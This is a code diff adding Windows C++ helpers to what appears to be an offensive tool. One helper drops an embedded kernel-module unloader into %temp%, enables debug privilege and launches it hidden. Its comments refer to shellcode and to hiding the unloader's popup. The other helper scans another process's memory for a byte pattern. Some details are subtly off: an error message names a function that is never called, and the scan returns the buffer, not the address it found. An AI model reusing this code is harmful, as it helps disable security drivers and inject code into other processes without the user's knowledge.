@@ -87,3 +87,128 @@ bool utils::CreateFileToTempFromResource(const wchar_t* file_name, const uint8_t
 
 	return true;
 }
+
+
+HANDLE utils::CreateKernelModuleUnloaderProcess() {
+
+	HANDLE result = INVALID_HANDLE_VALUE;
+
+	// drop kernelmoduleunloader.exe into the %temp% folder
+
+	std::wstring UnloaderPath = utils::GetFullTempPath() + L"\\" + L"Kernelmoduleunloader.exe";
+	utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe", kernelmoduleunloader_resource::kernelmoduleunloader, sizeof(kernelmoduleunloader_resource::kernelmoduleunloader));
+
+
+	// adjust process token
+
+	BOOL bRet = FALSE;
+	HANDLE hToken = NULL;
+	LUID luid = { 0 };
+
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
+	{
+		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
+		{
+			TOKEN_PRIVILEGES tokenPriv = { 0 };
+			tokenPriv.PrivilegeCount = 1;
+			tokenPriv.Privileges[0].Luid = luid;
+			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+			bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+		}
+	}
+	if (!bRet) {
+		Error("RtlAdjustPrivilege failed");
+		return result;
+	}
+
+	// spawn kernelmoduleunloader.exe process
+	// TODO: hide kernelmoduleunloader's popup
+
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	if (!CreateProcess(NULL,
+		(LPWSTR)UnloaderPath.c_str(),
+		NULL,
+		NULL,
+		TRUE,          // bInheritHandles: Because shellcode requires SE_PRIVILEGE_ENABLED
+		CREATE_NO_WINDOW,
+		NULL,
+		NULL,
+		&si,
+		&pi))
+	{
+		Error("CreateProcess failed 0x%x", GetLastError());
+		return result;
+	}
+
+	result = pi.hProcess;
+	//CloseHandle(pi.hThread);
+	//CloseHandle(pi.hProcess);
+	return result;
+}
+
+LPVOID utils::SearchProcessMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN pattern, DWORD flProtect, DWORD flAllocationType, DWORD flType) {
+
+	LPVOID offset = 0;
+	LPVOID lpBuffer = NULL;
+	MEMORY_BASIC_INFORMATION mbi = {};
+
+	lpBuffer = VirtualAlloc(NULL, sizeof(MEMORY_PATTERN), MEM_COMMIT, PAGE_READWRITE);
+	if (lpBuffer == NULL) {
+		Error("VirtualAlloc failed");
+		return NULL;
+	}
+
+#ifdef _DEBUG
+	//printf("BaseAddress");
+	//printf("\tRegionSize");
+	//printf("\tProtect");
+	//printf("\tState");
+	//printf("\tType\n");
+#endif // _DEBUG
+
+	while (VirtualQueryEx(hProcess, offset, &mbi, sizeof(mbi)))
+	{
+
+#ifdef _DEBUG
+		//printf("0x%llx", mbi.BaseAddress);
+		//printf("\t%llx", mbi.RegionSize);
+		//printf("\t%lx", mbi.AllocationProtect);
+		//printf("\t%lx", mbi.State);
+		//printf("\t%lx\n", mbi.Type);
+#endif // _DEBUG
+
+		// Compare patterns
+
+		ReadProcessMemory(hProcess, mbi.BaseAddress, lpBuffer, sizeof(MEMORY_PATTERN), NULL);
+		SIZE_T res = RtlCompareMemory(lpBuffer, (const void*)&pattern, sizeof(MEMORY_PATTERN));
+
+		if (mbi.AllocationProtect == flProtect && mbi.State == flAllocationType && mbi.Type == flType && res != (SIZE_T)0)
+		{
+
+			res = RtlCompareMemory((LPVOID)((UINT64)lpBuffer + (UINT64)0x8), (const void*)&pattern, sizeof(MEMORY_PATTERN));
+
+			if (mbi.AllocationProtect == flProtect && mbi.State == flAllocationType && mbi.Type == flType && res != (SIZE_T)0)
+			{
+				Log("Pattern found at 0x%x (match pattern count: 0x%d)", mbi.BaseAddress, res);
+				break;
+			}
+		}
+
+		if (mbi.BaseAddress > (PVOID)0x7fffffff)
+		{
+			Error("Scan error: No pattern found");
+			break;
+		}
+
+		offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
+	}
+
+	return lpBuffer;
+}
